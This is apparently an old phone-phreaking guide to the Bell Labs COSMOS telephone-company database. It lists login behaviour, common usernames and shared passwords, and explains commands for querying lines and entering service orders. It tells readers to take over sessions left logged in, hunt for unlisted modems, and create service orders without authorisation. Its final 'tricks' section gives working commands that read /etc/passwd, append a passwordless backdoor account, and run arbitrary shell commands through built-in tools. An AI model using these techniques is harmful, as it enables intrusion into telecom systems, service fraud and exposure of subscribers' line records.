PRELUDE
In the past, many files have been written about COSMOS.  I
have always been rather disappointed in their quality and in
their presentation, so I have taken on the responsibility of
doing one myself.  This should sum up COSMOS for everyone who
reads it.  It contains formats for very useful commands, an
entire transaction list, COSMOS "tricks", and a list of all COSMOS
abbreviations and their formats.
=============================================================================
INTRODUCTION
Bell Labs COmputer System for Mainframe OperationS  (COSMOS)
is basically just a database for maintaining records of
equipment and other line information and generating reports
on that information.  The system is usually set up on a DEC
PDP 11/45 or 11/70.
The main responsibilities of the COSMOS system are:
              Maintaining records
              Issuing reports
              Processing service and work orders
              Assigning telephone numbers
              Load balancing for switching computers
              Output of ESS recent change information
LOGGING ON
When connecting to COSMOS the system will respond with:
;Login:  or  LOGIN:
at which point you enter a username.  The system will then
prompt:
PASSWORD:
at which point you enter the password for that username.
Finally, the system will prompt:
WC?
which asks you to enter the wire center for the exchange you
will be using in your work.  After successfully completing
the login sequence you will be given the system prompt which
will be the two letter id of the wire center you entered and a
percent sign:  "WC% "
To log off at this or at any point you can type control-y.
One of the major flaws in COSMOS security is that unless a
control-y is received the terminal is not logged out, even if
the user disconnects.  Many times when you connect to COSMOS,
you will be dropped right into the "WC% " prompt.  This even
happens on major BOC packet networks quite often.  If you are
lucky enough to receive a 'WC#' prompt you have access to the
COSNIX shell, and can issue various unix-like commands, like
ls, cd, cat, et cetera.
COSMOS usernames are usually issued as two letters corresponding to
whatever center will be using that account, and two numbers.
EX:  LA01
Using the above example "LA01" there will most probably be numerous
"LA" accounts, possibly "LA01" through "LA15" or higher.  This is true
for most COSMOS usernames.  More often than not, all accounts used by the
same center will have the same password as well.  Some common usernames
and their owners are:
              ROOT     System Manager
              SYS      System Manager
              ML       Loop Assignment
              LA       Loop Assignment
              DN       Main Distributing Frame
              IN       Repair Service
              RS       Repair Service
              CE       LNAC
              LK       Account to execute INQuiries only
              JA       Mizar
              WLI      Work Load Indicator
Usernames may vary from BOC to BOC, but these are fairly standard.
=============================================================================
COSMOS TRANSACTION COMMANDS
COSMOS commands are three letter acronyms.  I will explain in
depth the commands I have found most useful, and then list
the remainder.  Remember, do not attempt to learn the formats for COSMOS
transactions online.  You will probably not figure out correct inputs, and
will most likely cause problems for the system manager and yourself.
Commands are entered in a specific ways.  The command desired is
entered at the WC% prompt.  A second string of data is entered at
the next line which designates the type of transaction desired.
This line is prefixed with on of the following four letters:
H - Header Line
I - In Line
O - Out Line
R - Remark Line
The most commonly used line is the H line.  It is a required input in
almost all COSMOS transactions.  From the second line on, COSMOS will
prompt with an underscore "_" as the system prompt, to let the user
know that it is waiting for input.  When all needed data has been entered,
the command is executed by typing a "." at the beginning of a new line.
If you wish to process a command, but stay in command level in order to
process further commands after the one you are currently entering has
finished, a ";" can be entered at the beginning of a new line.
To cancel the transaction you are entering, a "Q" should be entered at
the beginning of a new line.  To interrupt output, the break character
is "^C".  When entering criteria, you may enter all like data (all H-line, all
I-line, etc...) on one line using a "/" between input prefixes:
EX:  H TN 222-0000,222-9999/RMKT SWBT?/US 1FB
is the same as entering:
H TN 222-0000,222-9999
_H RMKT SWBT?
_H US 1FB
One of the most commonly used commands is INQ (Complete
Circuit Inquiry).  There is also a short form of INQ called
ISH.  This command requires only the use of H lines.  Multiple H lines
can be entered to narrow a search or to print multiple reports.
Valid H line facilities used are:
              BL       Bridge Lifter
              CON      Concentrator
              CP       Cable Pair
              CKID     Circuit ID
              MR       Message Register
              OE       Office Equipment Number
              PL       Private Line Circuit Number
              TK       Trunk Cable and Pair Number
              TN       Telephone Number
              TP       Tie Pair
              XN       "X" Number
              TRE      Transmission Equipment
              TER      Terminal Number
              GP       Group Number
              ORD      Work Order
EX:  To print information on telephone number 222-2222
WC% INQ
H TN 222-2222
_.
EX:  To print information on cable pair 11-1111
WC% INQ
H CP 11-1111
_.
INQ will print a full report whatever circuit you examine, while ISH
will print a shorter, easier to read report.  Below is an actual ISH
done on a Telenet node.

When you pull an inquiry on a number that you are interested in, you will
be given its cable pair, its order number, any numbers that connect to
it through a hunt sequence, and you will see any remarks entered about the
number.  This information can prove to be very valuable.  For instance:
You suspect that a company has a modem online, yet you don't want to waste
time sequentially dialing thousands of numbers.  You can simply enter
an ISH on the number to get its cable pair, then begin pulling ISH
reports on cable pairs close to the main one.  Then you need only dial
twenty or so numbers that are in the same area as the main number, and
you will find the computer.
Another extremely valuable command is SIR (Sorting Inquiry by Range).
With SIR, you can print the circuit information on all lines that match
specified criteria within a specified range of numbers.  This command
requires only H line input, but numerous lines may be entered in order to
narrow down the search.  You may also use the wildcard character ("?") to
encompass a larger range when doing a SIR.  There are many applications
for SIR, but I will only show examples on a few I have found to be
most useful.
Many times entries have special remarks entered about the circuit.  These
are usually entered as RMKT (Remarks on Telephone Number), but they may be
entered as RMKO (Remarks on Office Equipment) or RMKP (Remarks on Cable
Pair), depending upon what the person entering felt like typing.
Most of the time the remarks really don't correspond like they should.
Telephone companies are pretty thorough about remarking on a line that
they own and they will usually use the RMKT prefix.
EX:  To find all telephone company (Southwestern Bell) lines in prefix 222
WC% SIR
H TN 222-0000,222-9999
_H RMKT SWBT?
_.
The "?" after SWBT acts as a wildcard.  Typing SWB? would perform the same
search.
You may also want to search by STT (Telephone number status).  Some types of
STT are:
              AU   Auxiliary
              NP   Non-published
              OF   Official (telco owned)
              TS   Test
Another way to distinguish types of number is by CS (Customer Class of
Service).  CS values tend to vary from BOC to BOC, but business lines
will usually look like "1FB", or at least contain a "B".  Residences
will usually look like "1FR."  Sometimes telco lines are listed as "1OF",
but may also be entered as "1FB".  On lines in a hunt group, the CS will
be appended with the letter "H", as "1FBH".
Let's say a company owns a block on an exchange (333) running from 1000 to
3500.  You want to find all possible computer numbers in that area.  Chances
are good that they are not listed.
EX:
WC% SIR
H TN 333-1000,333-3500
_H STT NP
_H CS 1FB
_.
The above would list all non-published business numbers from 333-1000
to 333-3500.
To find all numbers that are translated 800 numbers in the same prefix range
as above, you can do the following:
EX:
WC% SIR
H TN 333-1000,333-3500
_H PL ?800?
_.
This will prints reports on all private lines registered as 800 numbers.
There is also a shorter version of SIR, LTN (List Telephone Numbers), and a
more detailed version, GFR (General Facility Report), but I have found
SIR to be the better of the three to use for my purposes.
In order to change line attributes, or to create new lines you will need
to use two commands SOE (Service Order Entry), and RCP (Recent Change
Packager).  These two commands are pretty detailed in what they can do,
so I will just cover a few of their options.
SOE will allow you to assign a new circuit, and specify the desired telephone
number, custom calling features, billing telephone number, etc.
SOE requires both "H" and "I" lines of input.  The best way to enter
a new service order is to have COSMOS pick your new telephone number and
assign the needed office equipment number.  If you want to pick your own
telephone number, the number you pick must have a status (STO) of SP, LI, RS,
or PD (with a disconnect date before the due date on your new service order).
This is so that you do not try to assign a number that is currently working
to your new service order.  You can check this by doing an ISH on all the
variations of numbers you desire, and checking the STO.  You can also get a
list of available numbers in a given prefix using the NAI command.  You
should also do a SIR of recent entries, to try to find the proper format of
order numbers, so that you do not reuse one, or make one up that is formatted
incorrectly.  Another method to make sure that you have the correct formatting
of order numbers is to call the phone company and request the installation of
a line in the area you are working in.  They will tell you your service order
number for reference.  Later, you can merely cancel the order.  You will also
have to find a valid cable pair, so do an ISH on whatever number written in
your junction box that is not working, and then make sure there is no pending
connect orders entered on it.
To enter a service order for a new connection, having COSMOS pick an available
telephone number and assign proper office equipment numbers, you would do
the following:
EX:
WC% SOE
H ORD SO123456/OT NC/DD DD-MM-YY   (Use valid Day, Month, Year for Due Date)
_I TN ?/US 1FR/FEA TNNL/OE ?/CP XX-YYYY   (Use valid cable pair for XX-YYYY)
_.
You would now need to enter RCP and make a correctly formatted recent change
report for the order you entered so RCMAC can pick up the order and directly
enter it into the switch.  What RCP does is take your order and change it into
actual switch programming, using templates that are stored in directories
corresponding to what type of switching equipment is used for that WC.
(EX:  ess5a)
EX:  To create a recent change package for the order entered above
WC% RCP
H ORD SO123455
_.
Using SOE you can specify custom calling features, you can specify billing
telephone numbers, you can establish service as coin, and several other
options by adding "I" line information corresponding to that particular
option.
              _I CCF XXXXXX       (XXXXXX is valid custom calling features)
              _I BTN NNX-XXXX     (NNX-XXXX is valid billing TN)
              _I TT C
To get a list of spare (available) telephone numbers in a given prefix, you
can use the NAI (Telephone Number Assignment Inquiry) command.  You only need
enter H line criteria.  In addition to searching by prefix (NNX), you can
search by switch type (TYP), or rate zone (RTZ).
EX:  To select one spare telephone number in 555 and make it reserved status
WC% NAI
H TT X/NNX 555/STT RS
_.
You may also have NAI print out several available numbers, however, you cannot
change the status unless you are printing one listing.
EX:
WC% NAI
H TT X/NNX 555/LC XX        (Where XX is a number between 1 and 25)
_.
To get a listing of all prefixes that exist in the Wire Center you are
logged in under, you can use the command DDS (Display DS Table).  This
command will list the ranges that exist for a given input.
To list all telephone numbers in a given WC:
WC% DDS
H TN ?
_.
To list all cable pair ranges:
WC% DDS
H CP ?
_.
To change from one Wire Center to another, you use the command WCC (Wire
Center Change).  This is a very straight forward command.
EX:
WC% WCC NW
NW%
To allow for redirection in your COSMOS commands, you must execute the
DIO command.  This command is rather important for manipulating commands
to work for you.
EX:
WC% DIO
To see what transactions other people logged in are running, you can use the
command TSNAP (on certain generics)
EX:
WC% TSNAP
There are about one hundred other COSMOS commands that are all defined at the
end of this file.  I cannot go into detail on all of them but I will list them
and their meanings.
=============================================================================
COSMOS TRICKS
Even if you don't have full COSNIX access, you can basically execute
any command or read any file that exists in the system.  Using the INQ
(or ISH) command and redirection, you can open and display any file.
EX:  To display the password file
WC% INQ </ETC/PASSWD
This will display the file, however, since this is a flaw in the command,
it thinks the file is to be input for INQ, and each line will be preceded
with "ILLEGAL LINE TYPE", but this can be ignored.
Other files to look at:
/USR/FACS/WCFILE     List of all Wire Centers
/ETC/MATRIX.P        Permission Matrix (Who can execute what commands)
You may or may not want to try the following.  There is a high probability
that you will be noticed on the system.  If your local COSMOS ports are
usually left logged in, don't bother doing this.  However, if your COSMOS
ports are always logged out, and you almost never get in, and you happen
to stumble upon one left logged for the first time in months, it might be
worth a try.
There are a few ways to make a new account on COSMOS; however, you need to
be able to write to the password file.  Some systems allow this, but most do
not.
The easiest way involves using the echo command and redirection.
EX:
WC% echo "EB01::0::y:1:/tmp:/usr/cosmos:/usr/preop:/usr/so" >>/etc/passwd
This will add user EB01 to the end of the password file.
If you do not have access to echo you can do the same thing using the TED
command (Text Editor).
WC% TED >>/etc/passwd
S.O. NO.= SO123456
IS THIS A NEW S.O. (Y on NO) Y
1d
a
EB01::0::y:1:/tmp:/usr/cosmos:/usr/preop:/usr/so
^C
1p
w
q
After executing the above, you will need to clean up the /etc/passwd
file to remove the Service Order information put in there by TED.  You will
also need to remove the service order you created from the /usr/so/WC
directory.
If you cannot find a way to get shell access, you can still execute
any COSNIX command you desire again using TED, MSK (Output a Transaction
Mask), and ARG (Assemble and Run a Given Master File).
EX:
WC% TED
S.O. NO.= SO123456
IS THIS A NEW S.O. (Y or NO) Y
12
1d
a
$*
run!
^c
w
q
WC% MSK >/usr/so/newcmd
SO123456
WC% ARG
newcmd ls /etc
To execute the command, you need to do ARG, then the name of the
file (which I called newcmd), then the COSNIX command you wish to
execute.
If you can use echo this can be done much easier.
EX:
WC% echo '$*' >/usr/so/newcmd
WC% echo 'run!' >>/usr/so/newcmd
Then you can run your command normally with ARG.
WC% ARG
newcmd cd ..
IF you do not have access to echo, create a newcmd file and you can use it
that way.
WC% ARG
newcmd echo EB01::0::y:1:/tmp:/usr/cosmos:/usr/so:/usr/preop >>/etc/passwd
